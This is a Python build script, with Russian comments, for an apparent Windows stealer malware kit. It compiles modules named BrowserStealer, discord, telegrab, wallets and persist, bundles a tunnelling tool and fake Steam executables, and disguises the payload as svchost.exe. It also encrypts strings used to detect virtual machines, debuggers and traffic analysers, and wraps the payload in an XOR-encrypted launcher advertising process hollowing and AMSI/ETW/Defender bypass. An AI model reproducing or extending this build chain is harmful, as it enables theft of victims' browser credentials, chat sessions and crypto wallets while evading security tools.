"""
build_max.py - Максимально защищенная сборка с Nuitka
Запуск: python build_max.py
"""
import os
import sys
import subprocess
import shutil
import time
import random
from pathlib import Path
# Ensure we are running from the root directory
os.chdir(os.path.dirname(os.path.abspath(__file__)) + "/..")

MAIN_SCRIPT = "main.py"
OUTPUT_NAME = "loader"
VERSION_INFO = "build_cfg/version_info.txt"
MANIFEST_FILE = "build_cfg/app.manifest"
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
def print_color(msg, color=Colors.GREEN):
    print(f"{color}{msg}{Colors.RESET}")
def print_step(step, msg):
    print_color(f"  ⚡ {step}: {msg}", Colors.CYAN)
def check_dependencies():
    """Проверяет все необходимые инструменты"""
    print_color("""
╔══════════════════════════════════════════════════════════╗
║     🔍 CHECKING DEPENDENCIES                             ║
╚══════════════════════════════════════════════════════════╝
""", Colors.BLUE)
    print_step("Python", f"{sys.version.split()[0]}")

    if os.path.exists("requirements.txt"):
        print_step("Requirements", "Installing from requirements.txt...")
        subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"], check=True)
        print_step("Requirements", "✅ Installed all dependencies")

    try:
        result = subprocess.run([sys.executable, "-m", "nuitka", "--version"], capture_output=True, text=True, check=True)
        print_step("Nuitka", f"✅ {result.stdout.strip().splitlines()[0]}")
    except:
        print_step("Nuitka", "❌ Not found. Installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "nuitka"], check=True)
        print_step("Nuitka", "✅ Installed")

    if os.path.exists(os.path.join("core", "obfuscation.py")):
        print_step("Obfuscation", "✅ Found")
    else:
        print_step("Obfuscation", "❌ Not found! (required in core/obfuscation.py)")
        return False

    required_files = [MAIN_SCRIPT, VERSION_INFO, MANIFEST_FILE]
    all_good = True
    for f in required_files:
        if os.path.exists(f):
            print_step(f, "✅ Found")
        else:
            print_step(f, "❌ Not found!")
            all_good = False
    return all_good

def handle_remove_read_only(func, path, exc):
    import stat
    excvalue = exc[1]
    if func in (os.rmdir, os.remove, os.unlink) and excvalue.errno == 13:
        os.chmod(path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
        func(path)
    else:
        raise

def clean():
    """Очистка предыдущих сборок"""
    print_color("""
╔══════════════════════════════════════════════════════════╗
║     🧹 CLEANING PREVIOUS BUILDS                          ║
╚══════════════════════════════════════════════════════════╝
""", Colors.BLUE)
    folders = ["build", "dist", "__pycache__"]
    for folder in folders:
        if os.path.exists(folder):
            try:
                shutil.rmtree(folder, onerror=handle_remove_read_only)
                print_step(folder, "Removed")
            except Exception as e:
                print_step(folder, f"⚠️ Could not remove entirely: {e}")

    for file in Path(".").glob("*.exe"):
        if file.name.startswith("chromelevator"):
            print_step(file.name, "Protected - keeping")
            continue
        try:
            os.remove(file)
            print_step(file.name, "Removed")
        except:
            pass

def encrypt_all_strings():
    """Автоматически шифрует все строки через obfuscation.py"""
    print_color("""
╔══════════════════════════════════════════════════════════╗
║     🔐 ENCRYPTING STRINGS                                 ║
╚══════════════════════════════════════════════════════════╝
""", Colors.BLUE)
    try:
        sys.path.append(os.path.abspath("core"))
        from obfuscation import encrypt_string
        strings_to_encrypt = [
            "psutil", "winreg", "shutil", "socket", "subprocess",
            "ole32.dll", "kernel32", "ntdll", "dbghelp",
            r"SYSTEM\CurrentControlSet\Services\vmtools",
            r"SYSTEM\CurrentControlSet\Services\vmci",
            r"SOFTWARE\Oracle\VirtualBox Guest Additions",
            r"SOFTWARE\VMware, Inc.\VMware Tools",
            r"SOFTWARE\Microsoft\Windows\Windows Error Reporting",
            r"SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps",
            "wireshark", "fiddler", "procmon", "procexp",
            "x64dbg", "x32dbg", "ollydbg", "ida64", "ida", "ghidra",
            "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
            "vmwareuser", "vmsrvc", "vmusrvc", "python", "pythonservice",
            "httpdebuggerui", "charles", "burp",
            "apimonitor-x64", "apimonitor-x64.exe",
            "spystudio", "spystudio.exe",
            "rohitab", "apimonitor.exe",
            "winspy", "winspy.exe",
            "injector", "injector.exe",
            "fiddler", "fiddler.exe",
            "httpdebugger", "httpdebuggerui.exe",
        ]

        print_step("Encrypting", f"{len(strings_to_encrypt)} strings...")
        for s in strings_to_encrypt:
            encrypted = encrypt_string(s)
            print(f"    '{s}' -> decrypt_string('{encrypted}')")

        print_step("Complete", "All strings encrypted")
        return True
    except Exception as e:
        print_step("Error", f"Failed to encrypt strings - they may be hardcoded: {e}")
        return True

def build_payload():
    """Сборка основного полезного файла (Payload)"""
    print_color("""
╔══════════════════════════════════════════════════════════╗
║     📦 STAGE 1: BUILDING PAYLOAD                         ║
╚══════════════════════════════════════════════════════════╝
""", Colors.YELLOW)

    modules = ["requests", "telebot", "cryptography", "psutil", "keyboard", "pyaudio", "qrcode", "Cryptodome", "darkdetect", "webview"]

    cmd = [
        sys.executable, "-m", "nuitka",
        "--onefile",
        "--windows-console-mode=disable",
        "--lto=yes",
        "--output-dir=dist/payload_tmp",
        f"--include-data-file=SteamLogin.exe=SteamLogin.exe",
        f"--include-data-file=SteamAlert.exe=SteamAlert.exe",
        f"--include-data-file=core/chromelevator_x64.exe=core/chromelevator_x64.exe",
        f"--include-data-file=core/chromelevator_arm64.exe=core/chromelevator_arm64.exe",
        f"--include-data-file=core/encryptor.exe=core/encryptor.exe",
        f"--include-data-file=tools/bore.exe=tools/bore.exe",
        f"--include-data-file=tools/upx.exe=tools/upx.exe",
        f"--include-data-dir=assets=assets",
        f"--windows-manifest-from-file={MANIFEST_FILE}",
        "-o", "svchost.exe",
        MAIN_SCRIPT
    ]

    for mod in modules:
        cmd.append(f"--include-package={mod}")

    try:
        subprocess.run(cmd, check=True)
        payload_path = os.path.join("dist", "payload_tmp", "svchost.exe")
        if os.path.exists(payload_path):
            print_step("Payload", "✅ Successfully built")
            return payload_path
        return None
    except Exception as e:
        print_step("Payload", f"❌ Failed: {e}")
        return None

def create_loader(payload_path):
    """Создание loader.py с зашифрованным payload"""
    print_color("""
╔══════════════════════════════════════════════════════════╗
║     🔐 STAGE 2: GENERATING LOADER                        ║
╚══════════════════════════════════════════════════════════╝
""", Colors.YELLOW)

    try:
        import base64
        import random
        import string

        with open(payload_path, "rb") as f:
            payload_bytes = f.read()

        xor_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16)).encode()

        encrypted_bytes = bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(payload_bytes)])

        encoded_payload = base64.b64encode(encrypted_bytes).decode()

        template_path = os.path.join("core", "loader_template.py")
        if not os.path.exists(template_path):
            print_step("Loader", "❌ Template not found")
            return None

        with open(template_path, "r", encoding="utf-8") as f:
            template = f.read()

        loader_content = template.replace("{{PAYLOAD_B64}}", encoded_payload)
        loader_content = loader_content.replace("{{XOR_KEY}}", xor_key.decode())

        loader_file = "generated_loader.py"
        with open(loader_file, "w", encoding="utf-8") as f:
            f.write(loader_content)

        print_step("Loader", f"✅ Created {loader_file} with XOR encryption")
        return loader_file
    except Exception as e:
        print_step("Loader", f"❌ Failed: {e}")
        return None

CSC_PATH = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"

def compile_csharp():
    """Компиляция нативных C# модулей и Launcher"""
    print_color("""
╔══════════════════════════════════════════════════════════╗
║     🛠️  COMPILING NATIVE C# MODULES                       ║
╚══════════════════════════════════════════════════════════╝
""", Colors.YELLOW)
    
    if not os.path.exists(CSC_PATH):
        print_step("CSC", f"❌ Not found at {CSC_PATH}")
        return False

    modules = [
        ("defense", "SafetyManager.cs", "SafetyManager.dll", "/target:library /r:System.Security.dll /r:System.Management.dll"),
        ("defense", "persist.cs", "persist.dll", "/target:library"),
        ("native_modules", "BrowserStealer.cs", "BrowserStealer.dll", "/target:library /r:System.Security.dll /r:System.Web.Extensions.dll"),
        ("native_modules", "discord.cs", "discord.dll", "/target:library /r:System.Security.dll"),
        ("native_modules", "telegrab.cs", "telegrab.dll", "/target:library"),
        ("native_modules", "system.cs", "system.dll", "/target:library /r:System.Management.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll"),
        ("native_modules", "wallets.cs", "wallets.dll", "/target:library"),
        ("native_modules", "bridge.cs", "bridge.dll", "/target:library")
    ]

    for folder, src, out, target in modules:
        src_path = os.path.join(folder, src)
        out_path = os.path.join("defense", out)
        if not os.path.exists(src_path):
            print_step(src, "❌ Source not found")
            continue
        
        print_step(src, f"Compiling to {out}...")
        cmd = [CSC_PATH] + target.split() + [f"/out:{out_path}", src_path]
        try:
            subprocess.run(cmd, check=True, capture_output=True)
            print_step(out, "✅ Done")
        except subprocess.CalledProcessError as e:
            print_step(out, f"❌ Failed: {e.stderr.decode('cp1251')}")
            return False
    return True

def create_final_launcher(payload_path):
    """Создание финального Launcher.exe с вшитым Payload"""
    print_color("""
╔══════════════════════════════════════════════════════════╗
║     🚀 STAGE 4: GENERATING FINAL NATIVE LAUNCHER        ║
╚══════════════════════════════════════════════════════════╝
""", Colors.YELLOW)
    
    try:
        import base64
        import random
        import string

        # 1. Read and Encrypt Payload
        with open(payload_path, "rb") as f:
            payload_bytes = f.read()

        xor_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        xor_key_bytes = xor_key.encode()

        encrypted_bytes = bytes([b ^ xor_key_bytes[i % len(xor_key_bytes)] for i, b in enumerate(payload_bytes)])
        encoded_payload = base64.b64encode(encrypted_bytes).decode()

        # 2. Prepare Launcher Source
        launcher_src = os.path.join("defense", "launcher.cs")
        SafetyManager_src = os.path.join("defense", "SafetyManager.cs")
        
        with open(launcher_src, "r", encoding="utf-8") as f:
            content = f.read()

        content = content.replace("{{PAYLOAD_B64}}", encoded_payload)
        content = content.replace("{{XOR_KEY}}", xor_key)

        tmp_launcher = "defense/launcher_generated.cs"
        with open(tmp_launcher, "w", encoding="utf-8") as f:
            f.write(content)

        # 3. Compile Launcher EXE (linking SafetyManager)
        print_step("Launcher", "Compiling final native EXE...")
        out_exe = os.path.join("dist", f"{OUTPUT_NAME}.exe")
        
        # We compile launcher and SafetyManager together into one EXE for autonomy
        cmd = [
            CSC_PATH, 
            "/target:winexe", 
            f"/out:{out_exe}", 
            f"/win32manifest:{MANIFEST_FILE}",
            tmp_launcher, 
            SafetyManager_src
        ]
        
        subprocess.run(cmd, check=True, capture_output=True)
        
        if os.path.exists(tmp_launcher):
            os.remove(tmp_launcher)

        print_step("Final", f"✅ Result: {out_exe}")
        return out_exe

    except Exception as e:
        print_step("Launcher", f"❌ Failed: {e}")
        return None

def verify_build(exe_path):
    """Проверяет собранный EXE"""
    print_color("""
╔══════════════════════════════════════════════════════════╗
║     🔍 VERIFYING BUILD                                    ║
╚══════════════════════════════════════════════════════════╝
""", Colors.BLUE)
    if not os.path.exists(exe_path):
        print_step("Error", "EXE not found!")
        return False
    size = os.path.getsize(exe_path) / 1024 / 1024
    print_step("Size", f"{size:.2f} MB")
    return True

def main():
    """Основная функция сборки (Sanctuary Mode)"""
    print_color("""
╔══════════════════════════════════════════════════════════╗
║     🛡️  SANCTUARY C# BUILDER v5.0                         ║
║         Pure Native Defense + In-Memory Launcher        ║
╚══════════════════════════════════════════════════════════╝
""", Colors.CYAN)

    start_time = time.time()

    if not check_dependencies():
        print_color("\n❌ Dependency check failed!", Colors.RED)
        sys.exit(1)

    clean()
    
    # 1. Compile Helper DLLs
    if not compile_csharp():
        sys.exit(1)

    # 2. Build Python Payload (svchost.exe)
    payload_exe = build_payload()
    if not payload_exe:
        sys.exit(1)

    # 3. Create Final Native Launcher
    final_exe = create_final_launcher(payload_exe)

    if final_exe and verify_build(final_exe):
        # Cleanup
        if os.path.exists("dist/payload_tmp"):
            shutil.rmtree("dist/payload_tmp", ignore_errors=True)

        elapsed = time.time() - start_time
        final_size = os.path.getsize(final_exe) / 1024 / 1024
        print_color(f"""
╔══════════════════════════════════════════════════════════╗
║  ✅ SANCTUARY BUILD SUCCESSFUL!                           ║
╠══════════════════════════════════════════════════════════╣
║  📦 Output: {final_exe}
║  📏 Size: {final_size:.2f} MB
║  🛡️  Protection:                                        ║
║     • Pure C# Autonomous Launcher                       ║
║     • In-Memory RunPE (Process Hollowing)                ║
║     • Multi-Layer Native Bypass (AMSI/ETW/Def)          ║
╚══════════════════════════════════════════════════════════╝
""", Colors.GREEN)
    else:
        print_color("\n❌ BUILD FAILED!", Colors.RED)
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_color("\n\n⚠️  Build cancelled by user", Colors.YELLOW)
        sys.exit(0)
    except Exception as e:
        print_color(f"\n❌ Unexpected error: {e}", Colors.RED)
        sys.exit(1)
